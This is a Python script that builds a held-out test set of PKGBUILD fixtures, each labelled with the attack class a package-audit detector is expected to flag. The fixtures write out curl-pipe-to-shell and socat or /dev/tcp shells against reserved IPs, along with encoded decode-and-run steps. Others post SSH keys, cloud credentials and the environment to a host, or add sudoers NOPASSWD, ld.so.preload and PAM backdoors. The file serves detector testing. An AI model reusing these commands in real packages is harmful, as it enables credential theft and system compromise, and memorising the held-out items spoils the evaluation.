# SPDX-License-Identifier: GPL-2.0-or-later
# Third held-out set, written after the third freeze (3201717). The seed picks 40 of this pool. Never tuned on.
import os,sys,base64,hashlib
fix=sys.argv[1]
seed=open(fix+'/holdout3.seed').readline().strip()
H='# Inert test fixture: nothing here is ever run, and every address is reserved or fake.\npkgname=%s\npkgver=1.0\npkgrel=1\narch=(x86_64)\nurl=https://example.org/demo\nsource=(%s)\nsha256sums=(%s)\n'
SUM='0'*64
OK='https://example.org/demo.tar.gz'
IN=base64.b64encode(b'echo inert\n').decode()
T='.build/demo/src/demo-1.0/'
A='http://198.51.100.%d/x'
F={}
def fx(name,expect,body='',files=None,src=OK,suffix=''):
    F[name]=(expect,H%(name+suffix,src,SUM)+body,files or {})
B=lambda s:'build() {\n  %s\n}\n'%s
def I(name,expect,s):
    fx(name,expect,'install=demo.install\n',{'demo.install':'post_install() {\n  %s\n}\n'%s})
FE='fetch_execute_unverified'; DE='decode_execute'; CN='credential_to_network'; RC='read_credentials'
UP='undeclared_persistence'; SU='scriptlet_undeclared_file'; SO='source_off_upstream'; UD='unresolved_dynamic'; BC='bin_checksum_upstream'
fx('curl-o-chmod',FE,B('curl -so t %s\n  chmod +x t\n  ./t'%(A%1)))
fx('wget-qo-bash',FE,B('wget -qO- %s | bash'%(A%2)))
fx('aria2-run',FE,B('aria2c -o t %s\n  sh t'%(A%3)))
fx('python-requests-file',FE,B('python3 h.py'),{'h.py':'import requests\nexec(requests.get("%s").text)\n'%(A%4)})
fx('ruby-open-uri',FE,B('''ruby -e 'require "open-uri"; eval URI.open("%s").read' '''%(A%5)))
fx('php-get-contents',FE,B('''php -r 'eval(file_get_contents("%s"));' '''%(A%6)))
fx('node-fetch-eval',FE,B('''node -e 'fetch("%s").then(r=>r.text()).then(eval)' '''%(A%7)))
fx('lua-execute',FE,B('''lua -e 'os.execute("curl -s %s | sh")' '''%(A%8)))
fx('socat-exec',FE,B('socat TCP:198.51.100.9:80 EXEC:sh'))
fx('dev-tcp',FE,B('exec 3<>/dev/tcp/198.51.100.10/80\n  cat <&3 | sh'))
fx('base64-in-var',DE,B('x=%s\n  echo "$x" | base64 -d | bash'%IN))
fx('rev-string',DE,B("echo 'trent ohce' | rev | sh"))
fx('xxd-hex',DE,B('echo 6563686f | xxd -r -p | sh'))
fx('openssl-dec',DE,B('openssl enc -d -aes-256-cbc -in blob -k x | sh'))
fx('gzip-blob',DE,B('gunzip -c data.gz | sh'))
fx('printf-octal',DE,B(r"printf '\145\143\150\157' | sh"))
fx('sed-range-run',DE,B("sed -n '2,$p' data.bin | sh"))
fx('makefile-deep',FE,'',{T+'Makefile':'S=tools/x\nall:\n\t./$(S)/fetch.sh\n',T+'tools/x/fetch.sh':'#!/bin/sh\ncurl -s %s | sh\n'%(A%18)})
fx('cmake-nested',FE,'',{T+'src/sub/CMakeLists.txt':'execute_process(COMMAND sh -c "curl -s %s | sh")\n'%(A%19)})
fx('setup-cmdclass',FE,'',{T+'setup.py':'import os\nclass C:\n    def run(self):\n        os.system("curl -s %s | sh")\n'%(A%20)})
fx('conftest-check',FE,'check() {\n  pytest\n}\n',{T+'conftest.py':'import os\nos.system("curl -s %s | sh")\n'%(A%21)})
fx('npm-preinstall',FE,B('npm install'),{T+'package.json':'{"scripts":{"preinstall":"curl -s %s | sh"}}\n'%(A%22)})
fx('build-rs-sh',FE,'',{T+'build.rs':'use std::process::Command;\nfn main() { Command::new("sh").arg("-c").arg("curl -s %s | sh").status().unwrap(); }\n'%(A%23)})
fx('gradle-exec',FE,B('gradle build'),{T+'build.gradle':"task x(type: Exec) { commandLine 'sh', '-c', 'curl -s %s | sh' }\n"%(A%24)})
fx('ssh-key-post',CN,B('curl -d @$HOME/.ssh/id_ed25519 %s'%(A%25)))
fx('aws-cred-form',CN,B('curl -F f=@$HOME/.aws/credentials %s'%(A%26)))
fx('gnupg-tar-nc',CN,B('tar cz ~/.gnupg | nc 198.51.100.27 80'))
fx('discord-copy',RC,B("cp ~/.config/discord/'Local Storage'/leveldb/x /tmp/x"))
fx('gitcreds-pipe',CN,B('cat ~/.git-credentials | curl -d @- %s'%(A%29)))
fx('env-dump',CN,B('env | curl -d @- %s'%(A%30)))
fx('user-unit',UP,B('install -Dm644 x ~/.config/systemd/user/y.service'))
fx('bashrc-append',UP,B("echo 'x' >> ~/.bashrc"))
I('xdg-autostart',UP,'cp /usr/share/demo/y.desktop /etc/xdg/autostart/y.desktop')
I('cron-d',UP,"echo '* * * * * root /usr/bin/true' > /etc/cron.d/y")
I('ld-preload',SU,'echo /usr/lib/x.so >> /etc/ld.so.preload')
I('sudoers-drop',SU,"echo 'ALL ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/y")
I('pam-edit',SU,"sed -i '1i auth sufficient pam_permit.so' /etc/pam.d/sshd")
fx('pages-stranger',SO,src='https://example-stranger.github.io/demo.tar.gz')
fx('lookalike-tld',SO,src='https://example.net/demo.tar.gz')
fx('raw-ip-source',SO,src='http://198.51.100.40/x.tar.gz')
fx('bin-no-sum',BC,'package() {\n  install -Dm755 a "$pkgdir/usr/bin/a"\n}\n',src='https://example.org/a.deb',suffix='-bin')
F['bin-no-sum']=(BC,F['bin-no-sum'][1].replace('0'*64,'SKIP'),{})
fx('clone-stranger-make',SO,B('git clone https://github.com/example-stranger/x\n  make -C x'))
fx('patch-install-sh',FE,'prepare() {\n  patch -p1 -i ../fix.patch\n}\n',{'fix.patch':'--- a/install.sh\n+++ b/install.sh\n@@ -1 +1,2 @@\n #!/bin/sh\n+curl -s %s | sh\n'%(A%44)})
fx('patch-cmake',FE,'prepare() {\n  patch -p1 -i ../fix.patch\n}\n',{'fix.patch':'--- a/CMakeLists.txt\n+++ b/CMakeLists.txt\n@@ -1 +1,2 @@\n project(demo)\n+execute_process(COMMAND sh -c "curl -s %s | sh")\n'%(A%45)})
fx('name-in-parts',UD,B('c=cu\n  d=rl\n  "$c$d" -s %s | sh'%(A%46)))
fx('ifs-word',UD,B('x=c\n  ${x}url${IFS}-s${IFS}%s|sh'%(A%47)))
fx('find-exec',FE,B('curl -so x %s\n  find . -name x -exec sh {} \\;'%(A%48)))
fx('nohup-bg',FE,B('curl -so x %s\n  nohup sh x &'%(A%49)))
order=sorted(F,key=lambda n:hashlib.sha256(f'{seed}:{n}'.encode()).hexdigest())
print(len(F),'pool')
root=fix+'/holdout3'
for n in order[:40]:
    e,p,fs=F[n]
    d=f'{root}/{n}'; os.makedirs(d,exist_ok=True)
    open(d+'/EXPECT','w',newline='\n').write(e+'\n'); open(d+'/PKGBUILD','w',newline='\n').write(p)
    for k,v in fs.items():
        q=f'{d}/{k}'; os.makedirs(os.path.dirname(q),exist_ok=True); open(q,'w',newline='\n').write(v)
print('left out',sorted(order[40:]))
